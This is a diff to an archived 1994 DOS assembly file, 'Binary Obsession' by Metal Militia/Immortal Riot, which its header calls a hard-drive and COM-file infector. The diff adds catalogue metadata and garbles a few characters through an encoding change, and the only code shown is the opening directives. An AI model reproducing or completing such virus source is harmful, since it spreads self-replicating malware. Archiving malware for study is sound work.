@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      B
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; ------------------------------------------------------------------------------
 ;
 ;                       - Binary Obsession -
@@ -5,7 +16,7 @@
 ;                (c) 1994 Metal Militia/Immortal Riot 
 ;
 ; ------------------------------------------------------------------------------
-;            þ Undestructive Harddrive & COM-file infector þ
+;            ï¿½ Undestructive Harddrive & COM-file infector ï¿½
 ; ------------------------------------------------------------------------------
 		.model  tiny
 		.code
